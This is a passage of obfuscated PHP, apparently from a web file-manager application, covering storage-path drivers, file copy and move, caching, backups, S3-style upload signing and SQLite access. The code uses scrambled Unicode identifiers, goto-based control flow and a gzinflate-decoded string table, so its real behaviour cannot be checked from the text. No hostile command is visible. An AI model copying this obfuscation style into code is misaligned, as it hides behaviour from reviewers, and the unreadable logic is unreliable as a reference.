(!defined($FݞҺ)) { define($FݞҺ, self::systemPath($D)); } } } private static function systemPath($F) { goto b; D´: if ($Bؓ) { return $Bؓ; } if ($F == $dܔԈ[1047]) { $Bؓ = self::make(Model($dܔԈ[747])->systemRootPathAdd($dܔԈ[1056])); } else { $Bؓ = self::systemPath($dܔԈ[1047]); $eŅ躃 = self::sourceID($Bؓ); $Bؓ = self::make(Model($dܔԈ[747])->mkdir($eŅ躃, $F)); } Model($dܔԈ[1055])->set($C, $Bؓ); goto D팂͗; b: $dܔԈ =& $_SERVER[놫Ӱ]; $C = $dܔԈ[1054] . ucfirst($F); $Bؓ = Model($dܔԈ[1055])->get($C); goto D´; D팂͗: return $Bؓ; goto Bȇⶐ; Bȇⶐ: } public static function systemFolder($c) { $E = IO_PATH_SYSTEM_SOURCE . $c; $Aϭ = Cache::get($E); if (!$Aϭ) { $A骇 = IO::infoFull($E); if (!$A骇) { $Aϭ = IO::mkdir($E, REPEAT_SKIP); } else { $Aϭ = $A骇[$_SERVER[놫Ӱ][76]]; } Cache::set($E, $Aϭ, 3600 * 10); } return $Aϭ; } public static function defaultDriver() { return Model($_SERVER[놫Ӱ][689])->defaultDriver(); } public static function defaultIO() { $d젙 =& $_SERVER[놫Ӱ]; $A홊 = self::defaultDriver(); return $d젙[1057] . $A홊[$d젙[364]] . $d젙[1044]; } public static function fileTypeList() { $f¶٥ =& $_SERVER[놫Ӱ]; $bݢ = $GLOBALS[$f¶٥[6]][$f¶٥[1058]]; foreach ($bݢ as $C⳾ => $D䢼笉) { $aؼ = $f¶٥[1059] . $C⳾; $Aˬ = LNG($aؼ); if ($aؼ != $Aˬ) { $bݢ[$C⳾][$f¶٥[28]] = $Aˬ; } } return $bݢ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E˂) { parent::__construct($E˂); $this->signatureVersion($_SERVER[놫Ӱ][197]); } public function uploadFormData($a䌄, $A뛶 = 3600) { goto c; eŅ: return $A; goto a; bǗٶ: $Cð = sha1($eї); $dٰ = hash_hmac($bΚ[215], $Cð, $A); $A = array($bΚ[1064] => $CƟ, $bΚ[1068] => $Eԥ, $bΚ[1072] => base64_encode($eї), $bΚ[1069] => $eׯн, $bΚ[1070] => $this->accessKey, $bΚ[1073] => $Cċʫ, $bΚ[1074] => $dٰ, $bΚ[166] => $this->getHost()); goto eŅ; B㱐: $eї = array($bΚ[1062] => $e𦰸, $bΚ[1063] => array(array($bΚ[1064] => $CƟ), array($bΚ[1065] => $this->bucket), array($bΚ[1066], $bΚ[1067], $bΚ[33]), array($bΚ[1068] => $Eԥ), array($bΚ[1069] => $eׯн), array($bΚ[1070] => $this->accessKey), array($bΚ[1071] => $Cċʫ))); $eї = json_encode($eї); $A = hash_hmac($bΚ[215], $Cċʫ, $this->secret); goto bǗٶ; D: $Eԥ = $bΚ[1060]; $e𦰸 = gmdate($bΚ[1061], time() + $A뛶); $Cċʫ = (string) time() . $bΚ[68] . (string) (time() + $A뛶); goto B㱐; c: $bΚ =& $_SERVER[놫Ӱ]; $CƟ = $bΚ[182]; $eׯн = $bΚ[215]; goto D; a: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($aչ) { $this->pathParse = $aչ; $this->model = Model($_SERVER[놫Ӱ][1075]); } public function getPath($BĜ) { return trim($BĜ, $_SERVER[놫Ӱ][8]); } public function pathFather($BȬ) { $E = $this->parse($BȬ); $E = $this->infoSimple($BȬ); return $E ? $E[$_SERVER[놫Ӱ][457]] : !1; } public function getPathName($cՎ) { $a۞М = $this->infoSimple($cՎ); return $a۞М ? $a۞М[$_SERVER[놫Ӱ][28]] : !1; } public function getPathOuter($c݃) { if (!$c݃) { return $c݃; } $aއ = $this->parse($c݃); return KodIO::make($aއ[$_SERVER[놫Ӱ][364]]); } public function copyFolderFromIO($f݋, $CҜ, $f쬉, $c탌ȍ, $d˓뾱) { $aŴ = $this->model->copyFolderFromIO($f݋, $CҜ, $f쬉, $c탌ȍ, $d˓뾱); return KodIO::make($aŴ); } public function isParentOf($Dʉ, $A븻ϝ) { return $this->model->isParentOf($Dʉ, $A븻ϝ); } public function mkfile($d뇢Π, $B = '', $d⥤ = REPEAT_RENAME) { $C =& $_SERVER[놫Ӱ]; $Eǆ = $this->parse($d뇢Π); $d뇢Π = $Eǆ[$C[364]]; for ($BǴ = 0; $BǴ < count($Eǆ[$C[1076]]); $BǴ++) { $F = $Eǆ[$C[1076]][$BǴ]; if ($BǴ == count($Eǆ[$C[1076]]) - 1) { $d뇢Π = $this->model->mkfile($d뇢Π, $F, $B, $d⥤); break; } $d뇢Π = $this->model->mkdir($d뇢Π, $F, REPEAT_SKIP); } return $this->getPathOuter($d뇢Π); } public function mkdir($cܔ, $C = REPEAT_SKIP) { $fێ =& $_SERVER[놫Ӱ]; $fޖ = $this->parse($cܔ); $cܔ = $fޖ[$fێ[364]]; for ($E挡 = 0; $E挡 < count($fޖ[$fێ[1076]]); $E挡++) { $Aį = $fޖ[$fێ[1076]][$E挡]; $cܔ = $this->model->mkdir($cܔ, $Aį, $C); } return $this->getPathOuter($cܔ); } public function copyFile($a剚, $E㡠, $c = REPEAT_REPLACE) { $b =& $_SERVER[놫Ӱ]; $cӽ = $this->parse($E㡠); $c = $this->model->copy($a剚, $cӽ[$b[364]], $c, $cӽ[$b[76]]); return $c ? $this->getPathOuter($c) : !1; } public function moveFile($a󳢂, $a񗏔, $Ał = REPEAT_REPLACE) { $eȞ =& $_SERVER[놫Ӱ]; $fǸ = $this->parse($a񗏔); $A = $this->model->move($a󳢂, $fǸ[$eȞ[364]], $Ał, $fǸ[$eȞ[76]]); return $A ? $this->getPathOuter($A) : !1; } public function copy($Eإ։, $e, $Cݤ = REPEAT_REPLACE) { $B = $this->parse($e); $A = $this->model->copy($Eإ։, $B[$_SERVER[놫Ӱ][364]], $Cݤ); return $A ? $this->getPathOuter($A) : !1; } public function move($c, $F, $b܃ = REPEAT_REPLACE) { $cΔ = $this->parse($F); $cᅍ؂ = $this->model->move($c, $cΔ[$_SERVER[놫Ӱ][364]], $b܃); return $cᅍ؂ ? $this->getPathOuter($cᅍ؂) : !1; } public function remove($eï, $e = true) { return $this->model->remove($eï, $e); } public function rename($BڳΊ, $AШ݈) { $A罦 = $this->model->rename($BڳΊ, $AШ݈); return $A罦 ? $this->getPathOuter($BڳΊ) : $A罦; } public function size($D) { $B = $this->infoSimple($D); return $B ? $B[$_SERVER[놫Ӱ][78]] : 0; } public function infoSimple($a) { return $this->model->sourceInfo($a); } public function info($D뼳) { return $this->infoParse($D뼳); } public function infoAuth($aѦ㟈) { return $this->infoParse($aѦ㟈, !1, !0); } public function infoWithChildren($F֐ԍ) { return $this->infoParse($F֐ԍ, !0); } protected function infoParse($a, $AΓ = false, $eҢ = false) { if (!$AΓ) { return $this->model->pathInfo($a, $eҢ); } return $this->model->pathInfoMore($a); } public function infoFull($Fĳ) { $B· =& $_SERVER[놫Ӱ]; $EႳ = explode($B·[8], $Fĳ); $Bʑ = implode($B·[8], array_splice($EႳ, 1)); return $this->model->pathInfoByPath($EႳ[0], $Bʑ); } public function hashSimple($fΗ) { $a =& $_SERVER[놫Ӱ]; $a = $this->infoWithChildren($fΗ); return $a[$a[159]][$a[161]]; } public function hashMd5($dԃΨ) { $d =& $_SERVER[놫Ӱ]; $b܅ = $this->infoWithChildren($dԃΨ); return $b܅[$d[159]][$d[160]]; } public function exist($a) { $a͍ =& $_SERVER[놫Ӱ]; $bֻ = $this->parse($a); if (!$bֻ[$a͍[76]]) { return $this->isFile($a) || $this->isFolder($a); } $a = array($a͍[365] => $bֻ[$a͍[364]], $a͍[28] => $bֻ[$a͍[76]]); $B뇈 = $this->model->where($a)->find(); return $B뇈 ? !0 : !1; } public function isFile($dס) { $fЗ =& $_SERVER[놫Ӱ]; $B = $this->infoSimple($dס); return $B && $B[$fЗ[367]] == $fЗ[493] ? !1 : !0; } public function isFolder($AΏ) { $e =& $_SERVER[놫Ӱ]; $aĕ̃ = $this->infoSimple($AΏ); return $aĕ̃ && $aĕ̃[$e[367]] == $e[493] ? !0 : !1; } public function listPath($F̲, $b׃ = false) { $D϶ =& $_SERVER[놫Ӱ]; if ($F̲ == $D϶[33]) { return !1; } $c = array($D϶[365] => $F̲); if ($b׃) { return $this->model->listSource($c, -1); } return $this->model->listSource($c); } public function has($f, $e՛Ζ = false, $e = null) { $Cݠʊ =& $_SERVER[놫Ӱ]; $Fɋ = $this->infoWithChildren($f); if ($e՛Ζ) { return array($Cݠʊ[189] => $Fɋ[$Cݠʊ[189]], $Cݠʊ[188] => $Fɋ[$Cݠʊ[188]]); } return $e ? $Fɋ[$Cݠʊ[189]] : $Fɋ[$Cݠʊ[188]]; } public function listAll($b愱) { $bᚴȖ = IO::info($this->pathParse[$_SERVER[놫Ӱ][76]]); if (!$bᚴȖ) { return array(); } return $this->model->listAll($b愱); } public function getContent($E⢮) { return $this->model->getContent($E⢮); } public function setContent($b, $b = '') { return $this->model->setContent($b, $b); } public function fileSubstr($Ē̱, $a, $F򕔢) { return $this->model->fileSubstr($Ē̱, $a, $F򕔢); } public function download($bڱ, $B = '') { $D = $this->model->fileInfoGet($bڱ); IO::copy($D[$_SERVER[놫Ӱ][76]], $B); return $B; } public function upload($f࿢, $Dϫ, $fә = false, $bŉ = REPEAT_REPLACE) { $fߋ =& $_SERVER[놫Ӱ]; $d׎ԩ = $this->parse($f࿢); $Bװ = $this->model->addFile($d׎ԩ[$fߋ[364]], $Dϫ, $d׎ԩ[$fߋ[76]], $fә, $bŉ); return $this->getPathOuter($Bװ); } public function uploadFileByID($c, $Bވގ, $f) { $fƫ =& $_SERVER[놫Ӱ]; $Aɐ = $this->parse($c); $C됋 = $this->model->addFileByFileID($Aɐ[$fƫ[364]], $Bވގ, $Aɐ[$fƫ[76]], $f); return $this->getPathOuter($C됋); } public function addFileByRemote($eљ, $eߧ, $aԾ = array(), $c = '', $eӎ) { $D =& $_SERVER[놫Ӱ]; $F = $this->parse($eљ); $c = empty($c) ? $F[$D[76]] : $c; $eΌՅө = $this->model->addFileByRemote($F[$D[364]], $eߧ, $c, $aԾ, $eӎ); return $this->getPathOuter($eΌՅө); } public function uploadLink($BÄ, $eč = 0) { $D˗ =& $_SERVER[놫Ӱ]; $cǚ = $this->parse($BÄ); $BÄ = Model($D˗[536])->createFileName($cǚ[$D˗[76]]); $F = IO::uploadLink($BÄ, $eč); return $F; } public function fileNameAuto($a, $aț҆, $B其 = REPEAT_REPLACE, $a = false) { return $this->model->fileNameAuto($a, $aț҆, $B其, $a); } public function fileNameExist($eʷ, $b۰â) { return $this->model->fileNameExist($eʷ, $b۰â); } protected function _fileOut($f桉ص, $cڅ = false, $eͧ = false, $Aԕ = '', $dˆׇ = false) { goto dí; c: $eڴ룣 = $this->model->fileInfoGet($f桉ص); $Aԕ = $eڴ룣[$b鞋̟۱[160]] ? $eڴ룣[$b鞋̟۱[160]] : $Aԕ; $DŎ = isset($GLOBALS[$b鞋̟۱[1078]]) ? $GLOBALS[$b鞋̟۱[1078]] : $a[$b鞋̟۱[28]]; goto dÅϛ; dí: $b鞋̟۱ =& $_SERVER[놫Ӱ]; $a = $this->model->sourceInfo($f桉ص); if ($a[$b鞋̟۱[367]] == $b鞋̟۱[493]) { header($b鞋̟۱[1077]); die; } goto c; dÅϛ: if ($dˆׇ) { return IO::fileOutServer($eڴ룣[$b鞋̟۱[76]], $cڅ, $DŎ, $Aԕ); } IO::fileOut($eڴ룣[$b鞋̟۱[76]], $cڅ, $DŎ, $Aԕ); goto D; D: } public function fileOut($f, $f = false, $Bˠѐ = false, $dȅς = '') { $this->_fileOut($f, $f, $Bˠѐ, $dȅς); } public function fileOutServer($BÕ, $e̗ = false, $eǏ؏ = false, $F횥 = '') { $this->_fileOut($BÕ, $e̗, $eǏ؏, $F횥, !0); } protected function _fileOutImage($cʺ, $E = 250) { $F =& $_SERVER[놫Ӱ]; $f׹ = $this->model->sourceInfo($cʺ); if ($f׹[$F[367]] == $F[493]) { show_json($F[1079] . $cʺ, !1); } $GLOBALS[$F[1078]] = $f׹[$F[28]]; $c¸ = $this->model->fileInfoGet($cʺ); IO::fileOutImage($c¸[$F[76]], $E); } public function fileOutImage($DΑΏ, $B۾ = 250) { $this->_fileOutImage($DΑΏ, $B۾); } public function fileOutImageServer($A, $c = 250) { $this->_fileOutImage($A, $c); } public function link($CĒȵ, $a = '') { $aѸ = $this->model->fileInfoGet($CĒȵ); return IO::link($aѸ[$_SERVER[놫Ӱ][76]], $a); } protected function parse($b刅) { $B뿕 =& $_SERVER[놫Ӱ]; if (strstr($b刅, $B뿕[8]) === !1) { return array($B뿕[382] => intval($b刅), $B뿕[76] => $B뿕[33], $B뿕[1076] => array()); } $d = explode($B뿕[8], trim($b刅, $B뿕[8])); if (count($d) < 2) { show_tips($b刅 . $B뿕[1080]); } return array($B뿕[382] => intval($d[0]), $B뿕[76] => $d[1], $B뿕[1076] => array_slice($d, 1)); } } goto F֌ۧӬ; F¬: define($_SERVER[놫Ӱ][0], $_SERVER[놫Ӱ][1]); $_SERVER[] = explode($_SERVER[놫Ӱ][2], gzinflate(substr($_SERVER[놫Ӱ][3], 10, -8))); function Model($Aܠ = '', $Cˌ = '', $A𞎂Ѵ = '') { goto eΤ; EН: return $cлߺ[$d܊]; goto b⥚; Dɓ: if (isset($cлߺ[$d܊])) { return $cлߺ[$d܊]; } if ($Aܠ) { $Aܠ = strtoupper($Aܠ[0]) . substr($Aܠ, 1); $d𸛠 = $Aܠ . $Aꑝ[1]; if (class_exists($d𸛠)) { $cлߺ[$d܊] = new $d𸛠(); return $cлߺ[$d܊]; } } $cлߺ[$d܊] = new ModelBase($Aܠ, $Cˌ, $A𞎂Ѵ); goto EН; eΤ: $Aꑝ =& $_SERVER[]; static $cлߺ = array(); $d܊ = strtolower($Cˌ . $Aꑝ[0] . $Aܠ); goto Dɓ; b⥚: } goto dڈޏ; DΓɍ: class BackupFile { public function __construct() { } public function index() { goto E⻨ڼ; FܶǠ: Backup::set($Eُ؎); $this->_fileFilter($e); return !0; goto d; a㊞: $d񦾢 = (int) Model($_SERVER[놫Ӱ][707])->where($CӋ)->count($_SERVER[놫Ӱ][415]); $Fك = (int) Model($_SERVER[놫Ӱ][707])->where($CӋ)->sum($_SERVER[놫Ӱ][78]); $D = new TaskFileTransfer($_SERVER[놫Ӱ][732], $_SERVER[놫Ӱ][696], $d񦾢, LNG($_SERVER[놫Ӱ][697]) . $_SERVER[놫Ӱ][698] . LNG($_SERVER[놫Ӱ][733])); goto f; f: $D->task[$_SERVER[놫Ӱ][683]] = $Fك; $Eُ؎ = array($_SERVER[놫Ӱ][734] => $d񦾢, $_SERVER[놫Ӱ][735] => $Fك); Backup::set($Eُ؎); goto Eз; E⻨ڼ: $eя = Backup::get(); $D򘄒 = $eя[$_SERVER[놫Ӱ][278]][$_SERVER[놫Ӱ][164]][$_SERVER[놫Ӱ][415]]; $CӋ = array($_SERVER[놫Ӱ][416] => array($_SERVER[놫Ӱ][730], $D򘄒), $_SERVER[놫Ӱ][731] => array($_SERVER[놫Ӱ][316], $eя[$_SERVER[놫Ӱ][676]])); goto a㊞; D: $e = array(); $f = $A = 0; do { $F = $_SERVER[놫Ӱ][736]; $fߋ = Model($_SERVER[놫Ӱ][707])->where($CӋ)->field($F)->order($_SERVER[놫Ӱ][737])->selectPage($d𫣏, $F埏); $E¤ = !empty($fߋ[$_SERVER[놫Ӱ][350]]) ? $fߋ[$_SERVER[놫Ӱ][350]] : array(); foreach ($E¤ as $eՠ) { goto Aλ; DՓ: if (IO::exist($e΍)) { $D->updateFileEnd($eՠ[$_SERVER[놫Ӱ][28]], $eՠ[$_SERVER[놫Ӱ][78]]); } else { $e΍ = get_path_father($e΍); $d׏ = IO::mkdir($e΍); if (!$d׏ || !IO::copy($Cנյ, $e΍, $_SERVER[놫Ӱ][739])) { write_log($_SERVER[놫Ӱ][740] . $Cנյ . $_SERVER[놫Ӱ][741] . $e΍ . $_SERVER[놫Ӱ][468], $_SERVER[놫Ӱ][696]); continue; } } $D򘄒 = $eՠ[$_SERVER[놫Ӱ][415]]; $eў += 1; goto bࣦ; Aλ: if (!$this->_fileExist($eՠ, $e)) { $d񦾢 -= 1; $Fك -= (int) $eՠ[$_SERVER[놫Ӱ][78]]; write_log("\146\x69\154\145\x20\156\157\x74\40\x65\x78\151\163\x74\x2e\146\x69\154\145\111\x44\x3a{$eՠ[$_SERVER[놫Ӱ][415]]}\x2c\x20\x70\141\x74\150\72{$eՠ[$_SERVER[놫Ӱ][76]]}", $_SERVER[놫Ӱ][738]); continue; } $Cנյ = $eՠ[$_SERVER[놫Ӱ][76]]; $e΍ = "\173\x69\157\x3a{$eя[$_SERVER[놫Ӱ][676]]}\x7d" . substr($Cנյ, strlen("\173\x69\157\x3a{$eՠ[$_SERVER[놫Ӱ][708]]}\x7d")); goto DՓ; Aٙߎ: if ($D󫶾 >= 1024 * 1024 * 50) { $Eُ؎ = array($_SERVER[놫Ӱ][742] => $D򘄒, $_SERVER[놫Ӱ][743] => $A, $_SERVER[놫Ӱ][744] => $f); Backup::set($Eُ؎); $D󫶾 = $eў = 0; } goto C; bࣦ: $D󫶾 += $eՠ[$_SERVER[놫Ӱ][78]]; $A += 1; $f += $eՠ[$_SERVER[놫Ӱ][78]]; goto Aٙߎ; C: } $f = count($E¤); $F埏++; } while ($f == $d𫣏); goto b󖑥; b󖑥: $D->end(); $Eُ؎ = array($_SERVER[놫Ӱ][745] => 1, $_SERVER[놫Ӱ][688] => time(), $_SERVER[놫Ӱ][694] => 1, $_SERVER[놫Ӱ][742] => $D򘄒, $_SERVER[놫Ӱ][735] => $Fك, $_SERVER[놫Ӱ][734] => $d񦾢); if ($eў) { $Eُ؎[$_SERVER[놫Ӱ][743]] = $A; $Eُ؎[$_SERVER[놫Ӱ][744]] = $f; } goto FܶǠ; Eз: $F埏 = 1; $d𫣏 = 1000; $D󫶾 = $eў = 0; goto D; d: } private function _fileExist($fȉ, &$E݋ķ) { goto aֿČ; Főӌ: if (IO::exist($Dۼذ)) { return !0; } $B = get_path_father($Dۼذ); if (IO::exist($B)) { $E݋ķ[] = $fȉ[$F[415]]; return !1; } goto F; aళ: return !1; goto bጸ; F: $FϷ = array($F[708] => $fȉ[$F[708]], $F[76] => array($F[746], "{$B}\x25")); $dŮ = Model($F[707])->where($FϷ)->field($F[416])->select(); $E݋ķ = array_merge($E݋ķ, array_to_keyvalue($dŮ, $F[33], $F[415])); goto aళ; aֿČ: $F =& $_SERVER[놫Ӱ]; $Dۼذ = $fȉ[$F[76]]; if (in_array($fȉ[$F[415]], $E݋ķ)) { return !1; } goto Főӌ; bጸ: } private function _fileFilter($C˨) { $C᎛È =& $_SERVER[놫Ӱ]; if (empty($C˨)) { return; } $Bú = array($C᎛È[415] => array($C᎛È[7], array_unique($C˨))); $fӾ = Model($C᎛È[747])->where($Bú)->field($C᎛È[366])->select(); foreach ($fӾ as $DͶ) { Model($C᎛È[747])->remove($DͶ[$C᎛È[366]], !1); } } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto F; c񆟾: $e緆 = $GLOBALS[$E[6]][$E[334]]; $F⣧ = $e緆[$e緆[$E[748]]]; $Dژ͊ = $e緆[$E[749]]; goto fѶ; F: $E =& $_SERVER[놫Ӱ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto c񆟾; fѶ: switch ($e緆[$E[748]]) { case $E[17]: self::$handle = Model($E[750]); break; case $E[751]: self::$handle = new CacheRedis($F⣧, $Dژ͊); break; case $E[752]: self::$handle = new CacheMemcached($F⣧, $Dژ͊); break; case $E[164]: self::$handle = new CacheFile($F⣧, $Dژ͊); break; default: break; } return self::$handle; goto bĐ; bĐ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($e) { if (is_array($e) || is_object($e)) { $e = json_encode($e); } $e = rawurlencode($e); return KOD_SITE_ID . $_SERVER[놫Ӱ][71] . $e; } public static function get($Aƨ) { $fޠ㉲ = self::key($Aƨ); if (!isset(self::$memoryCache[$fޠ㉲])) { CacheLock::lock($Aƨ); $fą = self::init()->get($fޠ㉲); CacheLock::unlock($Aƨ); self::$memoryCache[$fޠ㉲] = unserialize($fą); } return self::$memoryCache[$fޠ㉲]; } public static function set($e녇, $Cޑ, $Fȑ݊ = false) { goto CǬ; b哪: CacheLock::unlock($e녇); return $D׼ʭ; goto f̘; CǬ: $BզśՇ = self::key($e녇); if (isset(self::$memoryCache[$BզśՇ]) && self::$memoryCache[$BզśՇ] === $Cޑ) { return !0; } if ($Fȑ݊ === 0) { self::$memoryCache[$BզśՇ] = $Cޑ; return !0; } goto FЧ; FЧ: CacheLock::lock($e녇); $D׼ʭ = self::init()->set($BզśՇ, serialize($Cޑ), $Fȑ݊); self::$memoryCache[$BզśՇ] = $Cޑ; goto b哪; f̘: } public static function remove($Cҟ) { goto dҧņ; cÜ: return $e厤; goto F䘴; F: CacheLock::lock($Cҟ); $e厤 = self::init()->remove($A); CacheLock::unlock($Cҟ); goto cÜ; dҧņ: $A = self::key($Cҟ); unset(self::$memoryCache[$A]); self::clearTimeout(); goto F; F䘴: } public static function clearMemory($dܵ慍 = false) { if ($dܵ慍) { $dܵ慍 = self::key($dܵ慍); unset(self::$memoryCache[$dܵ慍]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[놫Ӱ][753])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[놫Ӱ][754])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($AⰩ, $bԲć) { $bҏ =& $_SERVER[놫Ӱ]; $this->cachePath = $AⰩ[$bҏ[76]]; $this->prefix = $bҏ[755]; $this->cacheTime = $bԲć; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($E䱜) { $fʽݝ =& $_SERVER[놫Ӱ]; $E䱜 = str_replace(array($fʽݝ[723], $fʽݝ[94], $fʽݝ[70]), $fʽݝ[756], $E䱜); return $this->cachePath . $fʽݝ[757] . $E䱜 . $fʽݝ[758]; } public function set($a҂, $b, $fʩ = false) { $Aᕩŋ = $this->getFile($a҂); if (file_put_contents($Aᕩŋ, $this->prefix . $b, LOCK_EX)) { return !0; } @unlink($Aᕩŋ); return !1; } public function get($A׏) { $eֶ = $this->getFile($A׏); if (file_exists($eֶ) && filemtime($eֶ) < time() - $this->cacheTime) { @unlink($eֶ); return !1; } $C = @file_get_contents($eֶ); return substr($C, strlen($this->prefix)); } public function remove($C) { $e = $this->getFile($C); return @unlink($e); } public function deleteAll() { $Cǿ =& $_SERVER[놫Ӱ]; $EÑ = scandir($this->cachePath); foreach ($EÑ as $c) { $FԬ = $this->cachePath . $c; if (strpos($FԬ, $Cǿ[758]) && strpos($FԬ, $Cǿ[759])) { @unlink($FԬ); } } } public function clearTimeout() { $B =& $_SERVER[놫Ӱ]; $BÍ = scandir($this->cachePath); foreach ($BÍ as $EΗ) { $F = $this->cachePath . $EΗ; if (strpos($F, $B[758]) && strpos($F, $B[759]) && filemtime($F) < time() - $this->cacheTime) { @unlink($F); } } } } goto Bᦻ; E: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto F; F: $Eք =& $_SERVER[놫Ӱ]; global $in, $config; $this->config =& $config; goto a; a: $this->in =& $in; $this->values[$Eք[6]] =& $config; $this->values[$Eք[7]] =& $in; goto dǜ; dǜ: $this->tpl = TEMPLATE . MOD . $Eք[8]; $this->_classObjectID = mt_rand(0, 10000); goto Eإ; Eإ: } public function loadClass($e) { if (1 === func_num_args()) { $this->{$e} = new $e(); } else { $Aʗ = new ReflectionClass($e); $C骡 = func_get_args(); array_shift($C骡); $this->{$e} = $Aʗ->newInstanceArgs($C骡); } return $this->{$e}; } protected function assign($Cӎ, $bӻ) { $this->values[$Cӎ] = $bӻ; } protected function display($eۏ) { ob_end_clean(); extract($this->values); require $this->tpl . $eۏ; } } class DbSqliteBase extends Db { public function __construct($fٶ = '') { $bؓ =& $_SERVER[놫Ӱ]; if (!extension_loaded($bؓ[9])) { think_exception(think_lang($bؓ[10]) . $bؓ[11]); } if (!empty($fٶ)) { if (!isset($fٶ[$bؓ[12]])) { $fٶ[$bؓ[12]] = 438; } $this->config = $fٶ; if (empty($this->config[$bؓ[13]])) { $this->config[$bؓ[13]] = array(); } } } public function connect($bǊ襘 = '', $e卣 = 0) { $C =& $_SERVER[놫Ӱ]; if (!isset($this->linkID[$e卣])) { goto e߄; B톂ѭ: $this->linkID[$e卣] = $DǼ($bǊ襘[$C[17]], $bǊ襘[$C[12]]); if (!$this->linkID[$e卣]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto A; e߄: if (empty($bǊ襘)) { $bǊ襘 = $this->config; } $b殭 = !empty($bǊ襘[$C[13]][$C[14]]) ? $bǊ襘[$C[13]][$C[14]] : $this->pconnect; $DǼ = $b殭 ? $C[15] : $C[16]; goto B톂ѭ; A: @sqlite_busy_timeout($this->linkID[$e卣], 30000); if (1 != think_config($C[18])) { unset($this->config); } goto F; F: } return $this->linkID[$e卣]; } public function free() { $this->queryID = null; } public function query($A) { goto A۹՜; A۹՜: $d =& $_SERVER[놫Ӱ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a; A׎: think_status($d[20]); $this->queryID = sqlite_query($this->_linkID, $A); $this->debug(); goto DΙ; a: $this->queryStr = $A; if ($this->queryID) { $this->free(); } think_action_status($d[19], 1); goto A׎; DΙ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $D = $this->getAll(); return $D; } goto A; A: } public function execute($aɢ׏) { goto d; B: $this->queryStr = $aɢ׏; if ($this->queryID) { $this->free(); } think_action_status($Ç[21], 1); goto eЅ; eЅ: think_status($Ç[20]); $D = sqlite_exec($this->_linkID, $aɢ׏); $this->debug(); goto D㆐; d: $Ç =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B; D㆐: if (!1 === $D) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto FЪ; FЪ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[놫Ӱ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B҄̃Ц = sqlite_query($this->_linkID, $_SERVER[놫Ӱ][23]); if (!$B҄̃Ц) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b = sqlite_query($this->_linkID, $_SERVER[놫Ӱ][24]); if (!$b) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $bϡ = array(); if ($this->numRows > 0) { for ($DƱ¬ = 0; $DƱ¬ < $this->numRows; $DƱ¬++) { $bϡ[$DƱ¬] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $bϡ; } public function getFields($B) { $C =& $_SERVER[놫Ӱ]; $Cڷ = $this->query($C[25] . $B . $C[26]); $c = array(); if ($Cڷ) { foreach ($Cڷ as $Bᬞ => $DФя) { $c[$DФя[$C[27]]] = array($C[28] => $DФя[$C[27]], $C[29] => $DФя[$C[30]], $C[31] => (bool) ($DФя[$C[32]] === $C[33]), $C[34] => $DФя[$C[35]], $C[36] => strtolower($DФя[$C[37]]) == $C[38], $C[39] => strtolower($DФя[$C[40]]) == $C[41]); } } return $c; } public function getTables($a = '') { $AӔŪ =& $_SERVER[놫Ӱ]; $d = $this->query($AӔŪ[42] . $AӔŪ[43] . $AӔŪ[44]); $D׬߻ = array(); foreach ($d as $bХ => $b) { $D׬߻[$bХ] = current($b); } return $D׬߻; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B =& $_SERVER[놫Ӱ]; $d順ݏ = sqlite_last_error($this->_linkID); $this->error = $d順ݏ . $B[4] . sqlite_error_string($d順ݏ); if ($B[33] != $this->queryStr) { $this->error .= LNG($B[45]) . $this->queryStr; } think_trace($this->error, $B[33], $B[46]); return $this->error; } public function escapeString($b) { return sqlite_escape_string($b); } public function parseLimit($dԲ) { $dݶڄ =& $_SERVER[놫Ӱ]; $eף = $dݶڄ[33]; if (!empty($dԲ)) { $dԲ = explode($dݶڄ[47], $dԲ); if (count($dԲ) > 1) { $eף .= $dݶڄ[48] . $dԲ[1] . $dݶڄ[49] . $dԲ[0] . $dݶڄ[50]; } else { $eף .= $dݶڄ[48] . $dԲ[0] . $dݶڄ[50]; } } return $eף; } } class DbSqlite3Base extends Db { public function __construct($Cג = '') { $a =& $_SERVER[놫Ӱ]; if (!class_exists($a[51])) { think_exception(think_lang($a[10]) . $a[52]); } if (!empty($Cג)) { if (!isset($Cג[$a[12]])) { $Cג[$a[12]] = 438; } $this->config = $Cג; if (empty($this->config[$a[13]])) { $this->config[$a[13]] = array(); } } } public function connect($C = '', $F匬 = 0) { $e̍ =& $_SERVER[놫Ӱ]; if (!isset($this->linkID[$F匬])) { if (empty($C)) { $C = $this->config; } $this->linkID[$F匬] = new SQLite3($C[$e̍[17]]); if (!$this->linkID[$F匬]) { think_exception($this->linkID[$F匬]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$F匬]->busyTimeout(30000); if (1 != think_config($e̍[18])) { unset($this->config); } } return $this->linkID[$F匬]; } public function free() { $this->queryID = null; } public function query($Eڌ扜) { goto aŊ; A: $this->queryStr = $Eڌ扜; if ($this->queryID) { 